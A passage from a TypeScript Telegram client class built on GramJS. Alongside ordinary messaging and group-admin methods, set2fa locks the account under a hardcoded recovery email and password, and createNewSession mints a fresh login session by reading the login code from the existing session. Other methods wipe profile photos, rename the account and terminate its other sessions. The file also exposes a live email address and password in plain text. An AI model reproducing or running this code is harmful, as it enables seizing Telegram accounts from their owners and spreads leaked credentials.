    async forwardMessage(toChatId: string, fromChatId: string, messageId: number) {
        try {
            await this.client.forwardMessages(toChatId, { fromPeer: fromChatId, messages: messageId })
        } catch (error) {
            console.log("Failed to Forward Message : ", error.errorMessage);
        }
    }

    async updateUsername(baseUsername) {
        let newUserName = ''
        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;
        if (username === '') {
            try {
                await this.client.invoke(new Api.account.UpdateUsername({ username }));
                console.log(`Removed Username successfully.`);
            } catch (error) {
                console.log(error)
            }
        } else {
            while (increment < 10) {
                try {
                    const result = await this.client.invoke(
                        new Api.account.CheckUsername({ username })
                    );
                    console.log(result, " - ", username)
                    if (result) {
                        await this.client.invoke(new Api.account.UpdateUsername({ username }));
                        console.log(`Username '${username}' updated successfully.`);
                        newUserName = username
                        break;
                    } else {
                        username = baseUsername + increment;
                        increment++;
                        await sleep(2000);
                    }
                } catch (error) {
                    console.log(error.message)
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    username = baseUsername + increment;
                    increment++;
                    await sleep(2000);
                }
            }
        }
        return newUserName;
    }

    async updatePrivacy() {
        try {
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneCall(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyProfilePhoto(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyForwards(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("forwards Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneNumber(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyStatusTimestamp(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll(),
                    ],
                })
            );
            console.log("LAstSeen Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyAbout(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
        }
        catch (e) {
            throw e
        }
    }

    async sendViewOnceMedia(chatId: string, buffer: Buffer, caption = '', isVideo?: boolean, filename?: string): Promise<Api.TypeUpdates> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            const actualFilename = filename || `viewonce_${Date.now()}.${isVideo ? 'mp4' : 'jpg'}`;
            const mimeType = isVideo ? 'video/mp4' : 'image/jpeg';
            const inputFile = await this.client.uploadFile({
                file: new CustomFile(actualFilename, buffer.length, actualFilename, buffer),
                workers: 1
            });
            const result = await this.client.invoke(new Api.messages.SendMedia({
                peer: chatId,
                media: isVideo
                    ? new Api.InputMediaUploadedDocument({
                        file: inputFile,
                        mimeType,
                        attributes: [
                            new Api.DocumentAttributeVideo({
                                supportsStreaming: true,
                                duration: 0,
                                w: 0,
                                h: 0
                            })
                        ],
                        ttlSeconds: 10
                    })
                    : new Api.InputMediaUploadedPhoto({
                        file: inputFile,
                        ttlSeconds: 10
                    }),
                message: caption,
                randomId: bigInt(Math.floor(Math.random() * 1000000000))
            }));

            console.log(`Sent view-once ${isVideo ? 'video' : 'photo'} to chat ${chatId}`);
            return result;
        } catch (error) {
            console.error('Error sending view-once media:', error);
            throw error;
        }
    }


    async getFileUrl(url: string, filename: string): Promise<string> {
        const response = await axios.get(url, { responseType: 'stream' });
        const filePath = `/tmp/${filename}`;
        await new Promise((resolve, reject) => {
            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);
            writer.on('finish', () => resolve(true));
            writer.on('error', reject);
        });
        return filePath;
    }

    async updateProfilePic(image) {
        try {
            const file = await this.client.uploadFile({
                file: new CustomFile(
                    'pic.jpg',
                    fs.statSync(
                        image
                    ).size,
                    image
                ),
                workers: 1,
            });
            console.log("file uploaded")
            await this.client.invoke(new Api.photos.UploadProfilePhoto({
                file: file,
            }));
            console.log("profile pic updated")
        } catch (error) {
            throw error
        }
    }

    async hasPassword() {
        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());
        return passwordInfo.hasPassword
    }

    async set2fa() {
        if (!(await this.hasPassword())) {
            console.log("Password Does not exist, Setting 2FA");

            const imapService = MailReader.getInstance();
            const twoFaDetails = {
                email: "storeslaksmi@gmail.com",
                hint: "password - India143",
                newPassword: "Ajtdmwajt1@",
            };

            try {
                await imapService.connectToMail();
                const checkMailInterval = setInterval(async () => {
                    console.log("Checking if mail is ready");

                    if (imapService.isMailReady()) {
                        clearInterval(checkMailInterval);
                        console.log("Mail is ready, checking code!");
                        await this.client.updateTwoFaSettings({
                            isCheckPassword: false,
                            email: twoFaDetails.email,
                            hint: twoFaDetails.hint,
                            newPassword: twoFaDetails.newPassword,
                            emailCodeCallback: async (length) => {
                                console.log("Code sent");
                                return new Promise(async (resolve, reject) => {
                                    let retry = 0;
                                    const codeInterval = setInterval(async () => {
                                        try {
                                            console.log("Checking code");
                                            retry++;
                                            if (imapService.isMailReady() && retry < 4) {
                                                const code = await imapService.getCode();
                                                console.log('Code:', code);
                                                if (code) {
                                                    await imapService.disconnectFromMail();
                                                    clearInterval(codeInterval);
                                                    resolve(code);
                                                }
                                            } else {
                                                clearInterval(codeInterval);
                                                await imapService.disconnectFromMail();
                                                reject(new Error("Failed to retrieve code"));
                                            }
                                        } catch (error) {
                                            clearInterval(codeInterval);
                                            await imapService.disconnectFromMail();
                                            reject(error);
                                        }
                                    }, 10000);
                                });
                            },
                            onEmailCodeError: (e) => {
                                console.error('Email code error:', parseError(e));
                                return Promise.resolve("error");
                            }
                        });

                        return twoFaDetails;
                    } else {
                        console.log("Mail not ready yet");
                    }
                }, 5000);
            } catch (e) {
                console.error("Unable to connect to mail server:", parseError(e));
            }
        } else {
            console.log("Password already exists");
        }
    }


    async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }

    async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }

    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(
                new Api.photos.GetUserPhotos({
                    userId: "me"
                })
            );
            console.log(`Profile Pics found: ${result.photos.length}`)
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(
                    new Api.photos.DeletePhotos({
                        id: <Api.TypeInputPhoto[]><unknown>result.photos
                    }))
            }
            console.log("Deleted profile Photos");
        } catch (error) {
            throw error
        }
    }

    async createNewSession(): Promise<string> {
        const me = <Api.User>await this.client.getMe();
        console.log("Phne:", me.phone);
        const newClient = new TelegramClient(new StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {
            connectionRetries: 1,
        });
        await newClient.start({
            phoneNumber: me.phone,
            password: async () => "Ajtdmwajt1@",
            phoneCode: async () => {
                console.log('Waiting for the OTP code from chat ID 777000...');
                return await this.waitForOtp();
            },
            onError: (err: any) => { throw err },

        });

        const session = <string><unknown>newClient.session.save();
        await newClient.disconnect();
        // await newClient.destroy();
        console.log("New Session: ", session)
        return session
    }

    async waitForOtp() {
        for (let i = 0; i < 3; i++) {
            try {
                console.log("Attempt : ", i)
                const messages = await this.client.getMessages('777000', { limit: 1 });
                const message = messages[0];
                if (message && message.date && message.date * 1000 > Date.now() - 60000) {
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    console.log("returning: ", code)
                    return code;
                } else {
                    console.log("Message Date: ", new Date(message.date * 1000).toISOString(), "Now: ", new Date(Date.now() - 60000).toISOString());
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    console.log("Skipped Code: ", code);
                    if (i == 2) {
                        return code;
                    }
                    await sleep(5000)
                }
            } catch (err) {
                await sleep(2000)
                console.log(err)
            }
        }
    }

    async createGroupWithOptions(options: GroupOptions): Promise<Api.Chat | Api.Channel> {
        if (!this.client) throw new Error('Client not initialized');

        const result: any = await this.client.invoke(
            new Api.channels.CreateChannel({
                title: options.title,
                about: options.description,
                megagroup: options.megagroup,
                forImport: options.forImport,
            })
        );

        // Find the channel in updates safely
        let channelId: bigInt.BigInteger | undefined;
        if ('updates' in result) {
            const updates = Array.isArray(result.updates) ? result.updates : [result.updates];
            const channelUpdate = updates.find(u => u instanceof Api.UpdateChannel);
            if (channelUpdate && 'channelId' in channelUpdate) {
                channelId = channelUpdate.channelId;
            }
        }

        if (!channelId) {
            throw new Error('Failed to create channel');
        }

        const channel = await this.client.getEntity(channelId);
        if (!(channel instanceof Api.Channel)) {
            throw new Error('Created entity is not a channel');
        }

        if (options.members?.length) {
            const users = await Promise.all(
                options.members.map(member => this.client.getInputEntity(member))
            );

            await this.client.invoke(new Api.channels.InviteToChannel({
                channel: await this.client.getInputEntity(channel),
                users
            }));
        }

        if (options.photo) {
            const buffer = await this.downloadFileFromUrl(options.photo);
            const inputFile = await this.client.uploadFile({
                file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
                workers: 1
            });

            await this.client.invoke(new Api.channels.EditPhoto({
                channel: await this.client.getInputEntity(channel),
                photo: new Api.InputChatUploadedPhoto({
                    file: inputFile
                })
            }));
        }

        return channel;
    }

    async updateGroupSettings(settings: {
        groupId: string;
        title?: string;
        description?: string;
        slowMode?: number;
        memberRestrictions?: any;
        username?: string;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const channel = await this.client.getEntity(settings.groupId);

        if (settings.title) {
            await this.client.invoke(new Api.channels.EditTitle({
                channel: channel,
                title: settings.title || ''
            }))
        };

        if (settings.description) {
            await this.client.invoke(new Api.messages.EditChatAbout({
                peer: channel,
                about: settings.description
            }));
        }

        if (settings.username) {
            await this.client.invoke(new Api.channels.UpdateUsername({
                channel: channel,
                username: settings.username
            }));
        }


        if (settings.slowMode !== undefined) {
            await this.client.invoke(new Api.channels.ToggleSlowMode({
                channel: channel,
                seconds: settings.slowMode
            }));
        }

        return true;
    }

    async scheduleMessageSend(opts: MessageScheduleOptions) {
        if (!this.client) throw new Error('Client not initialized');

        const scheduleDate = Math.floor(opts.scheduledTime.getTime() / 1000);

        if (opts.media) {
            const buffer = await this.downloadFileFromUrl(opts.media.url);

            const uploadedFile = await this.client.uploadFile({
                file: new CustomFile('media', buffer.length, 'media', buffer),
                workers: 1
            });

            return this.client.sendFile(opts.chatId, {
                file: uploadedFile,
                caption: opts.message,
                forceDocument: opts.media.type === 'document',
                scheduleDate
            });
        }

        return this.client.sendMessage(opts.chatId, {
            message: opts.message,
            schedule: Math.floor(opts.scheduledTime.getTime() / 1000)
        });
    }

    async getScheduledMessages(chatId: string): Promise<Api.TypeMessage[]> {
        if (!this.client) throw new Error('Client not initialized');

        const result = await this.client.invoke(new Api.messages.GetScheduledHistory({
            peer: chatId,
            hash: bigInt(0)
        }));

        return 'messages' in result && Array.isArray(result.messages)
            ? result.messages.filter(msg => msg instanceof Api.Message)
            : [];
    }

    async sendMediaAlbum(album: MediaAlbumOptions) {
        if (!this.client) throw new Error('Client not initialized');

        const mediaFiles = await Promise.all(
            album.media.map(async (item) => {
                const buffer = await this.downloadFileFromUrl(item.url);
                const uploadedFile = await this.client.uploadFile({
                    file: new CustomFile('media', buffer.length, 'media', buffer),
                    workers: 1
                });

                return new Api.InputSingleMedia({
                    media: item.type === 'photo'
                        ? new Api.InputMediaUploadedPhoto({ file: uploadedFile })
                        : new Api.InputMediaUploadedDocument({
                            file: uploadedFile,
                            mimeType: item.type === 'video' ? 'video/mp4' : 'application/octet-stream',
                            attributes: []
                        }),
                    message: item.caption || '',
                    entities: []
                });
            })
        );

        return this.client.invoke(new Api.messages.SendMultiMedia({
            peer: album.chatId,
            multiMedia: mediaFiles
        }));
    }

    async sendVoiceMessage(voice: {
        chatId: string;
        url: string;
        duration?: number;
        caption?: string;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const buffer = await this.downloadFileFromUrl(voice.url);

        return await this.client.invoke(new Api.messages.SendMedia({
            peer: voice.chatId,
            media: new Api.InputMediaUploadedDocument({
                file: await this.client.uploadFile({
                    file: new CustomFile('voice.ogg', buffer.length, 'voice.ogg', buffer),
                    workers: 1
                }),
                mimeType: 'audio/ogg',
                attributes: [
                    new Api.DocumentAttributeAudio({
                        voice: true,
                        duration: voice.duration || 0
                    })
                ]
            }),
            message: voice.caption || '',
            randomId: bigInt(Math.floor(Math.random() * 1000000000))
        }));
    }

    async cleanupChat(cleanup: {
        chatId: string;
        beforeDate?: Date;
        onlyMedia?: boolean;
        excludePinned?: boolean;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const messages = await this.client.getMessages(cleanup.chatId, {
            limit: 100,
            ...(cleanup.beforeDate && {
                offsetDate: Math.floor(cleanup.beforeDate.getTime() / 1000)
            })
        });

        const toDelete = messages.filter(msg => {
            if (cleanup.excludePinned && msg.pinned) return false;
            if (cleanup.onlyMedia && !msg.media) return false;
            return true;
        });

        if (toDelete.length > 0) {
            await this.client.deleteMessages(cleanup.chatId, toDelete.map(m => m.id), {
                revoke: true
            });
        }

        return { deletedCount: toDelete.length };
    }

    async updatePrivacyBatch(settings: {
        phoneNumber?: 'everybody' | 'contacts' | 'nobody';
        lastSeen?: 'everybody' | 'contacts' | 'nobody';
        profilePhotos?: 'everybody' | 'contacts' | 'nobody';
        forwards?: 'everybody' | 'contacts' | 'nobody';
        calls?: 'everybody' | 'contacts' | 'nobody';
        groups?: 'everybody' | 'contacts' | 'nobody';
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const privacyRules = {
            everybody: [new Api.InputPrivacyValueAllowAll()],
            contacts: [new Api.InputPrivacyValueAllowContacts()],
            nobody: [new Api.InputPrivacyValueDisallowAll()]
        };

        const updates = [];

        const privacyMap = {
            phoneNumber: Api.InputPrivacyKeyPhoneNumber,
            lastSeen: Api.InputPrivacyKeyStatusTimestamp,
            profilePhotos: Api.InputPrivacyKeyProfilePhoto,
            forwards: Api.InputPrivacyKeyForwards,
            calls: Api.InputPrivacyKeyPhoneCall,
            groups: Api.InputPrivacyKeyChatInvite
        };

        for (const [key, value] of Object.entries(settings)) {
            if (value && key in privacyMap) {
                updates.push(this.client.invoke(new Api.account.SetPrivacy({
                    key: new privacyMap[key](),
                    rules: privacyRules[value]
                })));
            }
        }

        await Promise.all(updates);
        return true;
    }

    async getSessionInfo() {
        if (!this.client) throw new Error('Client not initialized');

        const [authorizationsResult, devicesResult] = await Promise.all([
            this.client.invoke(new Api.account.GetAuthorizations()),
            this.client.invoke(new Api.account.GetWebAuthorizations())
        ]);

        const sessions = authorizationsResult.authorizations.map(auth => ({
            hash: auth.hash.toString(),
            deviceModel: auth.deviceModel,
            platform: auth.platform,
            systemVersion: auth.systemVersion,
            appName: auth.appName,
            dateCreated: new Date(auth.dateCreated * 1000),
            dateActive: new Date(auth.dateActive * 1000),
            ip: auth.ip,
            country: auth.country,
            region: auth.region
        }));

        const webSessions = devicesResult.authorizations.map(auth => ({
            hash: auth.hash.toString(),
            domain: auth.domain,
            browser: auth.browser,
            platform: auth.platform,
            dateCreated: new Date(auth.dateCreated * 1000),
            dateActive: new Date(auth.dateActive * 1000),
            ip: auth.ip,
            region: auth.region
        }));

        return {
            sessions,
            webSessions
        };
    }

    async terminateSession(options: {
        hash: string;
        type: 'app' | 'web';
        exceptCurrent?: boolean;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        if (options.exceptCurrent) {
            if (options.type === 'app') {
                await this.client.invoke(new Api.auth.ResetAuthorizations());
            } else {
                await this.client.invoke(new Api.account.ResetWebAuthorizations());
            }
            return true;
        }

        if (options.type === 'app') {
            await this.client.invoke(new Api.account.ResetAuthorization({
                hash: bigInt(options.hash)
            }));
        } else {
            await this.client.invoke(new Api.account.ResetWebAuthorization({
                hash: bigInt(options.hash)
            }));
        }
        return true;
    }

    async getChatStatistics(chatId: string, period: 'day' | 'week' | 'month') {
        if (!this.client) throw new Error('Client not initialized');

        const now = Math.floor(Date.now() / 1000);
        const periodInSeconds = {
            day: 24 * 60 * 60,
            week: 7 * 24 * 60 * 60,
            month: 30 * 24 * 60 * 60
        }[period];

        const messages = await this.client.getMessages(chatId, {
            limit: 100,
            offsetDate: now - periodInSeconds
        });

        const stats = {
            period,
            totalMessages: messages.length,
            uniqueSenders: new Set(messages.map(m => m.fromId?.toString()).filter(Boolean)).size,
            messageTypes: {
                text: messages.filter(m => !m.media && m.message).length,
                photo: messages.filter(m => m.media && m.media.className === 'MessageMediaPhoto').length,
                video: messages.filter(m => {
                    if (!m.media || m.media.className !== 'MessageMediaDocument') return false;
                    const doc = m.media.document;
                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('video/');
                }).length,
                voice: messages.filter(m => {
                    if (!m.media || m.media.className !== 'MessageMediaDocument') return false;
                    const doc = m.media.document;
                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('audio/');
                }).length,
                other: messages.filter(m => m.media && !['MessageMediaPhoto', 'MessageMediaDocument'].includes(m.media.className)).length
            },
            topSenders: Object.entries(
                messages.reduce((acc, msg) => {
                    const senderId = msg.fromId?.toString();
                    if (senderId) {
                        acc[senderId] = (acc[senderId] || 0) + 1;
                    }
                    return acc;
                }, {} as Record<string, number>)
            )
                .sort(([, a], [, b]) => b - a)
                .slice(0, 10)
                .map(([id, count]) => ({ id, count })),
            mostActiveHours: Object.entries(
                messages.reduce((acc, msg) => {
                    const hour = new Date(msg.date * 1000).getHours();
                    acc[hour] = (acc[hour] || 0) + 1;
                    return acc;
                }, {} as Record<number, number>)
            )
                .sort(([, a], [, b]) => b - a)
                .map(([hour, count]) => ({ hour: Number(hour), count }))
        };

        return stats;
    }

    private getMediaExtension(media: any): string {
        if (!media) return 'bin';

        switch (media.className) {
            case 'MessageMediaPhoto':
                return 'jpg';
            case 'MessageMediaDocument':
                const doc = media.document;
                if (!doc || !('mimeType' in doc)) return 'bin';

                const mime = doc.mimeType;
                if (mime?.startsWith('video/')) return 'mp4';
                if (mime?.startsWith('image/')) return mime.split('/')[1];
                if (mime?.startsWith('audio/')) return 'ogg';
                return 'bin';
            default:
                return 'bin';
        }
    }

    async setContentFilters(filters: ContentFilter) {
        if (!this.client) throw new Error('Client not initialized');

        this.contentFilters.set(filters.chatId, filters);

        if (!this.filterHandler) {
            this.filterHandler = this.client.addEventHandler(async (event) => {
                if (event instanceof NewMessageEvent) {
                    const message = event.message;
                    const chatId = message.chatId?.toString();
                    const filter = this.contentFilters.get(chatId);

                    if (!filter) return;

                    const shouldFilter = await this.evaluateMessage(message, filter);
                    if (shouldFilter) {
                        for (const action of filter.actions) {
                            await this.executeFilterAction(action, message);
                        }
                    }
                }
            }, new NewMessage({}));
        }
    }

    private async evaluateMessage(message: Api.Message, filter: ContentFilter): Promise<boolean> {
        if (filter.keywords?.length) {
            const messageText = message.message.toLowerCase();
            if (filter.keywords.some(keyword => messageText.includes(keyword.toLowerCase()))) {
                return true;
            }
        }

        if (filter.mediaTypes?.length && message.media) {
            const mediaType = this.getMediaType(message.media);
            if (filter.mediaTypes.includes(mediaType)) {
                return true;
            }
        }

        return false;
    }

    private async executeFilterAction(action: 'delete' | 'warn' | 'mute', message: Api.Message) {
        try {
            switch (action) {
                case 'delete':
                    await this.client.deleteMessages(message.chatId, [message.id], { revoke: true });
                    break;
                case 'warn':
                    await this.client.sendMessage(message.chatId, {
                        message: `⚠️ Message filtered due to content policy.`,
                        replyTo: message.id
                    });
                    break;
                case 'mute':
                    if (message.fromId) {
                        await this.client.invoke(new Api.channels.EditBanned({
                            channel: message.chatId,
                            participant: message.fromId,
                            bannedRights: new Api.ChatBannedRights({
                                untilDate: Math.floor(Date.now() / 1000) + 3600,
                                sendMessages: true
                            })
                        }));
                    }
                    break;
            }
        } catch (error) {
            console.error(`Failed to execute filter action ${action}:`, error);
        }
    }

    private getSearchFilter(filter: string): Api.TypeMessagesFilter {
        switch (filter) {
            case 'photo': return new Api.InputMessagesFilterPhotos();
            case 'video': return new Api.InputMessagesFilterVideo();
            case 'document': return new Api.InputMessagesFilterDocument();
            case 'url': return new Api.InputMessagesFilterUrl();
            case 'roundVideo': return new Api.InputMessagesFilterRoundVideo();
            case 'phtotoVideo': return new Api.InputMessagesFilterPhotoVideo();
            case 'phoneCalls': return new Api.InputMessagesFilterPhoneCalls({ missed: false });
            default: return new Api.InputMessagesFilterEmpty();
        }
    }

    private getMediaType(media: Api.TypeMessageMedia): 'photo' | 'video' | 'document' {
        if (media instanceof Api.MessageMediaPhoto) {
            return 'photo';
        } else if (media instanceof Api.MessageMediaDocument) {
            const document = media.document as Api.Document;
            if (document.attributes.some(attr => attr instanceof Api.DocumentAttributeVideo)) {
                return 'video';
            }
            return 'document';
        }
        return 'document';
    }

    private getEntityId(entity: Api.TypeInputPeer | Api.TypeUser | Api.TypeChat): string {
        if (entity instanceof Api.User) return entity.id.toString();
        if (entity instanceof Api.Channel) return entity.id.toString();
        if (entity instanceof Api.Chat) return entity.id.toString();
        return '';
    }

    async addGroupMembers(groupId: string, members: string[]): Promise<void> {
        if (!this.client) throw new Error('Client not initialized');

        const channel = await this.client.getInputEntity(groupId);
        const users = await Promise.all(
            members.map(member => this.client.getInputEntity(member))
        );

        await this.client.invoke(new Api.channels.InviteToChannel({
            channel: channel,
            users
        }));
    }

    async removeGroupMembers(groupId: string, members: string[]): Promise<void> {
        if (!this.client) throw new Error('Client not initialized');

        const channel = await this.client.getInputEntity(groupId);
        for (const member of members) {
            const user = await this.client.getInputEntity(member);
            await this.client.invoke(new Api.channels.EditBanned({
                channel: channel,
                participant: user,
                bannedRights: new Api.ChatBannedRights({
                    untilDate: 0,
                    viewMessages: true,
                    sendMessages: true,
                    sendMedia: true,
                    sendStickers: true,
                    sendGifs: true,
                    sendGames: true,
                    sendInline: true,
                    embedLinks: true
                })
            }));
        }
    }

    async promoteToAdmin(
        groupId: string,
        userId: string,
        permissions?: {
            changeInfo?: boolean;
            postMessages?: boolean;
            editMessages?: boolean;
            deleteMessages?: boolean;
            banUsers?: boolean;
            inviteUsers?: boolean;
            pinMessages?: boolean;
            addAdmins?: boolean;
            anonymous?: boolean;
            manageCall?: boolean;
        },
        rank?: string
    ): Promise<void> {
        if (!this.client) throw new Error('Client not initialized');

        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);

        await this.client.invoke(new Api.channels.EditAdmin({
            channel: channel,
            userId: user,
            adminRights: new Api.ChatAdminRights({
                changeInfo: permissions?.changeInfo ?? false,
                postMessages: permissions?.postMessages ?? false,
                editMessages: permissions?.editMessages ?? false,
                deleteMessages: permissions?.deleteMessages ?? false,
                banUsers: permissions?.banUsers ?? false,
                inviteUsers: permissions?.inviteUsers ?? true,
                pinMessages: permissions?.pinMessages ?? false,
                addAdmins: permissions?.addAdmins ?? false,
                anonymous: permissions?.anonymous ?? false,
                manageCall: permissions?.manageCall ?? false,
                other: false
            }),
            rank: rank || ''
        }));
    }

    async demoteAdmin(groupId: string, userId: string): Promise<void> {
        if (!this.client) throw new Error('Client not initialized');

        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);

        await this.client.invoke(new Api.channels.EditAdmin({
            channel: channel,
            userId: user,
            adminRights: new Api.ChatAdminRights({
                changeInfo: false,
                postMessages: false,
                editMessages: false,
                deleteMessages: false,
                banUsers: false,
                inviteUsers: false,
                pinMessages: false,
                addAdmins: false,
                anonymous: false,
                manageCall: false,
                other: false
            }),
            rank: ''
        }));
    }

    async unblockGroupUser(groupId: string, userId: string): Promise<void> {
        if (!this.client) throw new Error('Client not initialized');

        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);

        await this.client.invoke(new Api.channels.EditBanned({
            channel: channel,
            participant: user,
            bannedRights: new Api.ChatBannedRights({
                untilDate: 0,
                viewMessages: false,
                sendMessages: false,
                sendMedia: false,
                sendStickers: false,
                sendGifs: false,
                sendGames: false,
                sendInline: false,
                embedLinks: false
            })
        }));
    }

    async getGroupAdmins(groupId: string): Promise<Array<{
        userId: string;
        rank?: string;
        permissions: {
            changeInfo: boolean;
            postMessages: boolean;
            editMessages: boolean;
            deleteMessages: boolean;
            banUsers: boolean;
            inviteUsers: boolean;
            pinMessages: boolean;
            addAdmins: boolean;
            anonymous: boolean;
            manageCall: boolean;
        };
    }>> {
        if (!this.client) throw new Error('Client not initialized');

        const result = await this.client.invoke(new Api.channels.GetParticipants({
            channel: await this.client.getInputEntity(groupId),
            filter: new Api.ChannelParticipantsAdmins(),
            offset: 0,
            limit: 100,
            hash: bigInt(0)
        }));

        if ('users' in result) {
            const participants = result.participants as Api.ChannelParticipantAdmin[];
            const users = result.users;

            return participants.map(participant => {
                const adminRights = participant.adminRights as Api.ChatAdminRights;
                return {
                    userId: participant.userId.toString(),
                    rank: participant.rank || '',
                    permissions: {
                        changeInfo: adminRights.changeInfo || false,
                        postMessages: adminRights.postMessages || false,
                        editMessages: adminRights.editMessages || false,
                        deleteMessages: adminRights.deleteMessages || false,
                        banUsers: adminRights.banUsers || false,
                        inviteUsers: adminRights.inviteUsers || false,
                        pinMessages: adminRights.pinMessages || false,
                        addAdmins: adminRights.addAdmins || false,
                        anonymous: adminRights.anonymous || false,
                        manageCall: adminRights.manageCall || false
                    }
                };
            });
        }
        return [];
    }

    async getGroupBannedUsers(groupId: string): Promise<Array<{
        userId: string;
        bannedRights: {
            viewMessages: boolean;
            sendMessages: boolean;
            sendMedia: boolean;
            sendStickers: boolean;
            sendGifs: boolean;
            sendGames: boolean;
            sendInline: boolean;
            embedLinks: boolean;
            untilDate: number;
        };
    }>> {
        if (!this.client) throw new Error('Client not initialized');

        const result = await this.client.invoke(new Api.channels.GetParticipants({
            channel: await this.client.getInputEntity(groupId),
            filter: new Api.ChannelParticipantsBanned({ q: '' }),
            offset: 0,
            limit: 100,
            hash: bigInt(0)
        }));

        if ('users' in result) {
            const participants = result.participants as Api.ChannelParticipantBanned[];

            return participants.map(participant => {
                const bannedRights = participant.bannedRights as Api.ChatBannedRights;
                return {
                    userId: (participant.peer as Api.PeerChat).chatId.toString(),
                    bannedRights: {
                        viewMessages: bannedRights.viewMessages || false,
                        sendMessages: bannedRights.sendMessages || false,
                        sendMedia: bannedRights.sendMedia || false,
                        sendStickers: bannedRights.sendStickers || false,
                        sendGifs: bannedRights.sendGifs || false,
                        sendGames: bannedRights.sendGames || false,
                        sendInline: bannedRights.sendInline || false,
                        embedLinks: bannedRights.embedLinks || false,
                        untilDate: bannedRights.untilDate || 0
                    }
                };
            });
        }
        return [];
    }

    async searchMessages(params: {
        chatId: string;
        query?: string;
        types?: ('all' | 'text' | 'photo' | 'video' | 'voice' | 'document' | "roundVideo")[];
        minId?: number;
        maxId?: number;
        limit?: number;
    }): Promise<{
        video?: { messages: number[], total: number };
        photo?: { messages: number[], total: number };
        document?: { messages: number[], total: number };
        voice?: { messages: number[], total: number };
        text?: { messages: number[], total: number };
        all?: { messages: number[], total: number };
        roundVideo?: { messages: number[], total: number };
    }> {
        if (!this.client) throw new Error('Client not initialized');
        const finalResult = {
            video: { messages: [], total: 0 },
            photo: { messages: [], total: 0 },
            document: { messages: [], total: 0 },
            voice: { messages: [], total: 0 },
            text: { messages: [], total: 0 },
            all: { messages: [], total: 0 },
            roundVideo: { messages: [], total: 0 }
        }
        const { chatId, query = '', types = ['all'], maxId, minId, limit } = params;
        console.log("Types: ", types);
        for (const type of types) {
            const filter = this.getSearchFilter(type);
            const queryFilter = {
                limit: limit || 500,
                ...(maxId ? { maxId } : {}),
                ...(minId ? { minId } : {}),
            };

            console.log(type, queryFilter);
            const result = await this.client.invoke(
                new Api.messages.Search({
                    peer: await this.safeGetEntity(chatId),
                    q: query,
                    filter: filter,
                    ...queryFilter,
                    hash: bigInt(0),
                    fromId: undefined
                })
            );

            if (!('messages' in result)) {
                return {};
            }
            let messages = result.messages;
            console.log(type, result.messages.length);
            // Additional filtering for text-only messages if requested
            if (types.includes('text') && types.length === 1) {
                console.log("Text Filter");
                messages = messages.filter((msg: Api.Message) => !('media' in msg));
            }

            const processedMessages = await Promise.all(messages.map(async (message: Api.Message) => {
                return message.id
            }));

            const localResult = {
                messages: processedMessages,
                total: ('count' in result ? result.count : messages.length) || messages.length
            }
            finalResult[`${type}`] = localResult;
        }
        return finalResult
    }

    async getAllMediaMetaData(params: {
        chatId: string;
        types?: ('photo' | 'video' | 'document' | 'voice')[];
        startDate?: Date;
        endDate?: Date;
        maxId?: number;
        minId?: number;
    }) {
        if (!this.client) throw new Error('Client not initialized');
        const { chatId, types = ['photo', 'video'], startDate, endDate, maxId, minId } = params;
        let allMedia: any[] = [];
        let hasMore = true;
        let lastOffsetId = 0;
        const limit = 200;

        while (hasMore) {
            const response = await this.getMediaMetadata({
                chatId,
                types,
                startDate,
                endDate,
                limit,
                maxId: lastOffsetId,
                minId
            });
            console.log("hasMore: ", response.hasMore, "Total: ", response.total, "lastOffsetId: ", response.lastOffsetId);
            allMedia = allMedia.concat(response.messages);

            if (!response.hasMore) {
                hasMore = false;
                console.log('No more messages to fetch');
            } else {
                lastOffsetId = response.lastOffsetId;
                console.log(`Fetched ${allMedia.length} messages so far`);
            }
            await sleep(3000);
        }

        return {
            messages: allMedia,
